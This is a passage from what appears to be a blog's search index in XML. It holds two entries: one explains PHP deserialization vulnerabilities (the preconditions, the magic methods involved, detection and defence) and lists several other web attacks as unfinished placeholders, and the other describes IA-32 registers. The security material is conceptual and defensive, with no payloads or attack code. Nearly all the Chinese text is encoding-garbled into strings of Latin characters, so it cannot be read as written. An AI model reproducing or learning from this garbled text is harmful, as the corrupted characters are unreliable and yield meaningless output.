é€’åˆ°é­”æ³•å‡½æ•°ä¸­æ‰§è¡Œç›¸åº”çš„æ•æ„Ÿæ“ä½œï¼Œåˆ™ä¼šé€ æˆPHPååºåˆ—åŒ–æ¼æ´žçš„é£Žé™©ã€‚ serialize()ï¼šå°†ä¸€ä¸ªå¯¹è±¡è½¬æˆå­—ç¬¦ä¸²å½¢å¼ï¼Œæ–¹ä¾¿ä¿å­˜ä»¥ä¾¿äºŽä¸‹æ¬¡å†æ¬¡ååºåˆ—åŒ–å‡ºè¯¥å¯¹è±¡ç›´æŽ¥ä½¿ç”¨ã€‚ unserialize()ï¼šå°†åºåˆ—åŒ–åŽçš„å­—ç¬¦ä¸²ååºåˆ—åŒ–æˆä¸€ä¸ªå¯¹è±¡ã€‚ åˆ©ç”¨å‰æ unserialize()å‡½æ•°çš„å‚æ•°å¯æŽ§ï¼› ä»£ç ä¸­å­˜åœ¨ä¸€ä¸ªæž„é€ å‡½æ•°ã€æžæž„å‡½æ•°ã€__wakeup()å‡½æ•°ä¸­æœ‰å‘phpæ–‡ä»¶ä¸­å†™æ•°æ®çš„æ“ä½œçš„ç±»æˆ–æ‰§è¡ŒPHPä»£ç æˆ–å‘½ä»¤æ‰§è¡Œçš„ç±»ï¼› æ‰€å†™çš„å†…å®¹éœ€è¦æœ‰å¯¹è±¡ä¸­çš„æˆå‘˜å˜é‡çš„å€¼ã€‚ PHPé­”æ³•å‡½æ•° ä¸‹é¢åˆ—ä¸‹å¯èƒ½ç»å¸¸ç¢°åˆ°çš„é­”æ³•å‡½æ•°ï¼Œå…¶ä½™çš„æŸ¥æŸ¥èµ„æ–™ä¹ŸçŸ¥é“äº†ã€‚ __construct()ï¼šæž„é€ å‡½æ•°ï¼Œå½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨ã€‚å…·æœ‰æž„é€ å‡½æ•°çš„ç±»ä¼šåœ¨æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡æ—¶å…ˆè°ƒç”¨æ­¤æ–¹æ³•ï¼Œæ‰€ä»¥éžå¸¸é€‚åˆåœ¨ä½¿ç”¨å¯¹è±¡ä¹‹å‰åšä¸€äº›åˆå§‹åŒ–å·¥ä½œã€‚ __destruct()ï¼šæžæž„å‡½æ•°ï¼Œå½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨ã€‚ä¼šåœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œã€‚ __toString()ï¼šå½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨ã€‚æ­¤æ–¹æ³•å¿…é¡»è¿”å›žä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦åˆ™å°†å‘å‡ºä¸€æ¡E_RECOVERABLE_ERRORçº§åˆ«çš„è‡´å‘½é”™è¯¯ã€‚ __sleep()ï¼šå¸¸ç”¨äºŽæäº¤æœªæäº¤çš„æ•°æ®ï¼Œæˆ–ç±»ä¼¼çš„æ¸…ç†æ“ä½œã€‚åŒæ—¶ï¼Œå¦‚æžœæœ‰ä¸€äº›å¾ˆå¤§çš„å¯¹è±¡ï¼Œä½†ä¸éœ€è¦å…¨éƒ¨ä¿å­˜ï¼Œè¿™ä¸ªåŠŸèƒ½å°±å¾ˆå¥½ç”¨ã€‚serialize()å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³•__sleep()ã€‚å¦‚æžœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åŽæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œã€‚æ­¤åŠŸèƒ½å¯ä»¥ç”¨äºŽæ¸…ç†å¯¹è±¡ï¼Œå¹¶è¿”å›žä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­æ‰€æœ‰åº”è¢«åºåˆ—åŒ–çš„å˜é‡åç§°çš„æ•°ç»„ã€‚å¦‚æžœè¯¥æ–¹æ³•æœªè¿”å›žä»»ä½•å†…å®¹ï¼Œåˆ™ NULL è¢«åºåˆ—åŒ–ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ªE_NOTICEçº§åˆ«çš„é”™è¯¯ã€‚ _wakeup()ï¼šç»å¸¸ç”¨åœ¨ååºåˆ—åŒ–æ“ä½œä¸­ï¼Œä¾‹å¦‚é‡æ–°å»ºç«‹æ•°æ®åº“è¿žæŽ¥ï¼Œæˆ–æ‰§è¡Œå…¶å®ƒåˆå§‹åŒ–æ“ä½œã€‚unserialize()ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª\_wakeup()æ–¹æ³•ã€‚å¦‚æžœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨__wakeup()ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚ PHPååºåˆ—åŒ–æ¼æ´žåˆ†ç±» unserialize()ååºåˆ—åŒ–æ¼æ´ž sessionååºåˆ—åŒ–æ¼æ´ž pharååºåˆ—åŒ–æ¼æ´ž äºŒã€æ£€æµ‹æ–¹æ³•ä»¥PHPä¸ºä¾‹ï¼Œå…¨å±€æœç´¢PHPçš„ååºåˆ—åŒ–å‡½æ•°å¦‚unserialize()ï¼ŒæŸ¥çœ‹å…¶ä¸­æ¶‰åŠçš„æ–‡ä»¶ä»£ç ä¸­æ˜¯å¦å«æœ‰é­”æ³•å‡½æ•°æˆ–å…¶ä»–å±é™©çš„ç±»æ–¹æ³•ï¼Œä¸”è¿›ä¸€æ­¥æŽ’æŸ¥é­”æ³•å‡½æ•°çš„å†…å®¹æ˜¯å¦å¤–ç•Œå¯æŽ§ä¸”å­˜åœ¨å±é™©æ“ä½œã€‚ ä¸‰ã€é˜²å¾¡æ–¹æ³•1ã€è¦ä¸¥æ ¼æŽ§åˆ¶unserialize()å‡½æ•°çš„å‚æ•°ï¼ŒåšæŒç”¨æˆ·æ‰€è¾“å…¥çš„ä¿¡æ¯éƒ½æ˜¯ä¸å¯é çš„åŽŸåˆ™ï¼› 2ã€è¦å¯¹äºŽååºåˆ—åŒ–åŽçš„å˜é‡å†…å®¹è¿›è¡Œæ£€æŸ¥ï¼Œä»¥ç¡®å®šå†…å®¹æ²¡æœ‰è¢«æ±¡æŸ“ã€‚ XPathæ³¨å…¥ä¸€ã€åŸºæœ¬æ¦‚å¿µæ¼æ´žå®šä¹‰ å¾…å®Œå–„â€¦ äºŒã€æ£€æµ‹æ–¹æ³•å¾…å®Œå–„â€¦ ä¸‰ã€é˜²å¾¡æ–¹æ³•å¾…å®Œå–„â€¦ LDAPæ³¨å…¥å…·ä½“å¯å‚è€ƒæŠ€æœ¯è¯¦è§£ï¼šåŸºäºŽWebçš„LDAPæ³¨å…¥æ¼æ´ž CRLFæ³¨å…¥å¾…å®Œå–„â€¦ URLä¸å®‰å…¨é‡å®šå‘å¾…å®Œå–„â€¦ ç‚¹å‡»åŠ«æŒå¾…å®Œå–„â€¦ HTML5å®‰å…¨å¾…å®Œå–„â€¦ Webç¼“å­˜æ”»å‡»å¾…å®Œå–„â€¦]]></content>
      <categories>
        <category>Webå®‰å…¨åŸºç¡€</category>
      </categories>
      <tags>
        <tag>Webå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IA-32ï¼ˆIntel Architecture 32ä½ï¼‰å¯„å­˜å™¨]]></title>
    <url>%2F2019%2F01%2F28%2FIA-32%E5%AF%84%E5%AD%98%E5%99%A8%2F</url>
    <content type="text"><![CDATA[é€šç”¨å¯„å­˜å™¨ç”¨äºŽä¼ é€å’Œæš‚å­˜æ•°æ®ï¼Œå‚ä¸Žç®—æ•°é€»è¾‘è¿ç®—å¹¶ä¿å­˜è¿ç®—ç»“æžœã€‚IA-32æ¯ä¸ªé€šç”¨å¯„å­˜å™¨çš„å¤§å°éƒ½æ˜¯32ä½ï¼Œå³4ä¸ªå­—èŠ‚ï¼Œä¸»è¦ç”¨æ¥ä¿å­˜å¸¸é‡å’Œåœ°å€ç­‰ä¿¡æ¯ã€‚ ä»¥ä¸‹4ä¸ªé€šç”¨å¯„å­˜å™¨ä¸»è¦ç”¨äºŽç®—æœ¯è¿ç®—å¦‚ADDã€SUBã€XORã€ORç­‰ï¼Œå¸¸ç”¨äºŽä¿å­˜å¸¸é‡ä¸Žå˜é‡çš„å€¼ã€‚ EAXï¼šï¼ˆé’ˆå¯¹æ“ä½œæ•°å’Œç»“æžœæ•°æ®çš„ï¼‰ç´¯åŠ å™¨ï¼Œä¸€èˆ¬ç”¨åœ¨å‡½æ•°è¿”å›žå€¼ä¸­ï¼Œæ‰€æœ‰Win32 APIå‡½æ•°éƒ½ä¼šæŠŠè¿”å›žå€¼ä¿å­˜åˆ°EAXåŽå†è¿”å›žã€‚EAXå¯„å­˜å™¨åˆåˆ†ä¸ºé«˜ã€ä½Žå‡ ä¸ªç‹¬ç«‹çš„å¯„å­˜å™¨ï¼ŒAXï¼ˆ0-15ï¼‰ä¸ºEAXï¼ˆ0-31ï¼‰çš„ä½Ž16ä½ç‹¬ç«‹å¯„å­˜å™¨ï¼Œè€ŒAXåˆåˆ†ä¸ºé«˜8ä½çš„AHï¼ˆ8-15ï¼‰å’Œä½Ž8ä½çš„ALï¼ˆ0-7ï¼‰ä¸¤ä¸ªç‹¬ç«‹å¯„å­˜å™¨ï¼Œä¸‹é¢çš„EBXã€ECXå’ŒEDXåŒç†ã€‚ EBXï¼šï¼ˆDSæ®µä¸­çš„æ•°æ®æŒ‡é’ˆï¼‰åŸºå€å¯„å­˜å™¨ã€‚ ECXï¼šï¼ˆå­—ç¬¦ä¸²å’Œå¾ªçŽ¯æ“ä½œçš„ï¼‰è®¡æ•°å™¨ï¼Œå¦‚åœ¨å¾ªçŽ¯å‘½ä»¤LOOPä¸­ç”¨æ¥å¾ªçŽ¯è®¡æ•°ã€æ¯æ‰§è¡Œå®Œä¸€æ¬¡å¾ªçŽ¯ECXå°±è‡ªå‡ä¸€ã€‚ EDXï¼šï¼ˆI/OæŒ‡é’ˆï¼‰æ•°æ®å¯„å­˜å™¨ã€‚ ä»¥ä¸‹4ä¸ªé€šç”¨å¯„å­˜å™¨ä¸»è¦ç”¨äºŽä¿å­˜å†…å­˜åœ°å€çš„æŒ‡é’ˆã€‚ ESIï¼šï¼ˆå­—ç¬¦ä¸²æ“ä½œæºæŒ‡é’ˆï¼‰æºå˜å€å¯„å­˜å™¨ã€‚ EDIï¼šï¼ˆå­—ç¬¦ä¸²æ“ä½œç›®æ ‡æŒ‡é’ˆï¼‰ç›®çš„å˜å€å¯„å­˜å™¨ï¼ŒESIå’ŒEDIä¸Žç‰¹å®šæŒ‡ä»¤ï¼ˆLODSã€STOSã€REPã€MOVSç­‰ï¼‰ä¸€èµ·ä½¿ç”¨ï¼Œä¸»è¦ç”¨äºŽå†…å­˜å¤åˆ¶ã€‚ EBPï¼šï¼ˆSSæ®µä¸­æ ˆå†…æ•°æ®æŒ‡é’ˆï¼‰æ‰©å±•åŸºå€æŒ‡é’ˆå¯„å­˜å™¨ï¼Œè¡¨ç¤ºæ ˆåŒºåŸŸçš„åŸºåœ°å€ï¼Œå³æŒ‡å‘æ ˆæœ€ä¸Šé¢çš„ä¸€ä¸ªæ ˆå¸§çš„åº•éƒ¨ï¼Œå‡½æ•°è¢«è°ƒç”¨æ—¶ä¿å­˜ESPçš„å€¼ï¼Œå‡½æ•°è¿”å›žæ—¶å†æŠŠå€¼è¿”å›žESPï¼Œä¿è¯æ ˆä¸ä¼šå´©æºƒï¼ˆå³æ ˆå¸§æŠ€æœ¯ï¼‰ã€‚ ESPï¼šï¼ˆSSæ®µä¸­æ ˆæŒ‡é’ˆï¼‰æ ˆæŒ‡é’ˆå¯„å­˜å™¨ï¼ŒæŒ‡å‘æ ˆåŒºåŸŸçš„æ ˆé¡¶åœ°å€ã€‚ æ®µå¯„å­˜å™¨åœ¨IA-32çš„ä¿æŠ¤æ¨¡å¼ä¸­ï¼Œæ®µæ˜¯ä¸€ç§å†…å­˜ä¿æŠ¤æŠ€æœ¯ï¼Œå°†å†…å­˜åˆ’åˆ†ä¸ºå¤šä¸ªåŒºæ®µï¼Œå¹¶ä¸ºæ¯ä¸ªåŒºæ®µèµ‹äºˆèµ·å§‹åœ°å€ã€èŒƒå›´ã€è®¿é—®æƒé™ç­‰ä»¥ä¿æŠ¤å†…å­˜ã€‚æ®µå†…å­˜è®°å½•åœ¨SDTä¸­ï¼Œè€Œæ®µå¯„å­˜å™¨æŒæœ‰è¿™äº›SDTçš„ç´¢å¼•ã€‚æ¯ä¸ªæ®µå¯„å­˜å™¨çš„å¤§å°ä¸º16ä½ï¼Œå³2ä¸ªå­—èŠ‚ï¼Œä¸”æ¯ä¸ªæ®µå¯„å­˜å™¨æŒ‡å‘çš„æ®µæè¿°ç¬¦ä¸Žè™šæ‹Ÿå†…å­˜ç»“åˆï¼Œå½¢æˆä¸€ä¸ªçº¿æ€§åœ°å€ï¼Œå€ŸåŠ©åˆ†é¡µæŠ€æœ¯ï¼Œçº¿æ€§åœ°å€æœ€ç»ˆè¢«è½¬æ¢ä¸ºå®žé™…çš„ç‰©ç†åœ°å€ã€‚ CSï¼šCode Segmentï¼Œä»£ç æ®µå¯„å­˜å™¨ã€‚ DSï¼šData Segmentï¼Œæ•°æ®æ®µå¯„å­˜å™¨ã€‚ SSï¼šStack Segmentï¼Œæ ˆæ®µå¯„å­˜å™¨ã€‚ ESï¼šExtra (Data) Segmentï¼Œé™„åŠ ï¼ˆæ•°æ®ï¼‰æ®µå¯„å­˜å™¨ã€‚ FSï¼šData Segmentï¼Œæ•°æ®æ®µå¯„å­˜å™¨ï¼Œåœ¨ç¨‹åºè°ƒè¯•ä¸­ç»å¸¸ç”¨äºŽè®¡ç®—SEHï¼ˆç»“æž„åŒ–å¼‚å¸¸å¤„ç†æœºåˆ¶ï¼‰ã€TEBï¼ˆçº¿ç¨‹çŽ¯å¢ƒå—ï¼‰ã€PEBï¼ˆè¿›ç¨‹çŽ¯å¢ƒå—ï¼‰ã€‚ GSï¼šData Segmentï¼Œæ•°æ®æ®µå¯„å­˜å™¨ã€‚ å…¶ä¸­ESã€FSã€GSå¯„å­˜å™¨ç”¨æ¥å­˜æ”¾ç¨‹åºä½¿ç”¨çš„é™„åŠ æ•°æ®æ®µçš„æ®µåŸºå€ã€‚ ç¨‹åºçŠ¶æ€ä¸ŽæŽ§åˆ¶å¯„å­˜å™¨EFLAGSï¼šFlag Registerï¼Œæ ‡å¿—å¯„å­˜å™¨ï¼Œå¤§å°ä¸º4ä¸ªå­—èŠ‚å³32ä½ï¼Œæ¯ä¸€ä½éƒ½æœ‰æ„ä¹‰ï¼Œæœ‰äº›ä½ç”±ç³»ç»Ÿç›´æŽ¥è®¾å®šï¼Œæœ‰äº›ä½åˆ™æ ¹æ®ç¨‹åºå‘½ä»¤çš„æ‰§è¡Œç»“æžœè®¾ç½®ã€‚ å…ˆäº†è§£3ä¸ªå¸¸ç”¨çš„ä¸Žç¨‹åºè°ƒè¯•ç›¸å…³çš„æ ‡å¿—ï¼ŒZFï¼ˆZero Flagé›¶æ ‡å¿—ï¼‰ã€OFï¼ˆOverflow Flagæº¢å‡ºæ ‡å¿—ï¼‰ã€CFï¼ˆCarry Flagè¿›ä½æ ‡å¿—ï¼‰ã€‚ ZFï¼šè‹¥è¿ç®—ç»“æžœä¸º0ï¼Œåˆ™ä¸º1ï¼ˆTrueï¼‰ï¼Œå¦åˆ™ä¸º0ï¼ˆFalseï¼‰ã€‚ OFï¼šæœ‰ç¬¦å·æ•´æ•°æº¢å‡ºæ—¶ï¼Œåˆ™ä¸º1ã€‚æ­¤å¤–ï¼ŒMSBï¼ˆæœ€é«˜æœ‰æ•ˆä½ï¼‰æ”¹å˜æ—¶ï¼Œä¹Ÿä¸º1ã€‚ CFï¼šæ— ç¬¦å·æ•´æ•°æº¢å‡ºæ—¶ï¼Œåˆ™ä¸º1ã€‚ æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨EIPï¼šInstruction Pointerï¼ŒæŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ï¼Œä¿å­˜ç€CPUè¦æ‰§è¡Œçš„æŒ‡ä»¤åœ°å€ï¼Œå¤§å°ä¸º32ä½å³4ä¸ªå­—èŠ‚ã€‚ ç¨‹åºè¿è¡Œæ—¶ï¼ŒCPUä¼šè¯»å–EIPä¸­çš„ä¸€æ¡æŒ‡ä»¤åœ°å€ï¼Œä¼ é€æŒ‡ä»¤åˆ°æŒ‡ä»¤ç¼“å†²åŒºåŽï¼ŒEIPå¯„å­˜å™¨çš„å€¼å°†è‡ªåŠ¨å¢žåŠ ï¼Œå¢žåŠ çš„å¤§å°ä¸ºè¯»å–æŒ‡ä»¤çš„å­—èŠ‚å¤§å°ã€‚CPUæ¯æ¬¡æ‰§è¡Œå®Œä¸€æ¡æŒ‡ä»¤ï¼Œå°±ä¼šé€šè¿‡EIPå¯„å­˜å™¨è¯»å–å¹¶æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚ æ³¨æ„çš„å°±æ˜¯ï¼ŒEIPå¯„å­˜å™¨å’Œé€šç”¨å¯„å­˜å™¨ä¸åŒï¼Œä¸èƒ½ç›´æŽ¥ä¿®æ”¹EIPçš„å€¼ï¼Œåªèƒ½é€šè¿‡å…¶ä»–æŒ‡ä»¤é—´æŽ¥ä¿®æ”¹ï¼Œå¦‚JMPã€Jccã€CALLã€RETã€‚ä¹Ÿå¯ä»¥é€šè¿‡ä¸­æ–­æˆ–è€…å¼‚å¸¸æ¥ä¿®æ”¹EIPçš„å€¼ã€‚]]></content>
      <categories>
        <category>äºŒè¿›åˆ¶åŸºç¡€</category>
      </categories>
      <tags>
        <tag>äºŒè¿›åˆ¶</tag>
      </tags>
  </entry>
</search>
